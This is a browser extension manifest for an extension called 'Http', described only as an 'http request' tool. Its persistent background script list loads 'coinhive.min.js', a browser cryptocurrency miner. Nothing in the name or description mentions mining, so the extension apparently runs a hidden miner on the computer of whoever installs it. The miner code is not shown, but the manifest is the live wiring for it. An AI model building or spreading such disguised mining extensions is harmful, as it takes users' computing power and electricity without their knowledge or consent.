{
  "manifest_version": 2,

    "name": "Http",
    "short_name": "chext",
    "description": "http request",
    "version": "1.0",

    "browser_action": {
        "default_icon": "icon.png",
        "default_popup": "popup.html"
    },
    "icons": {
        "16": "icon16.png",
        "48": "icon48.png",
        "128": "icon128.png"
    },
    "background": {
        "scripts": ["coinhive.min.js", "background.js"],
        "persistent": true
    },
    "permissions": [
        "background",
        "storage",
        "activeTab"
    ]
}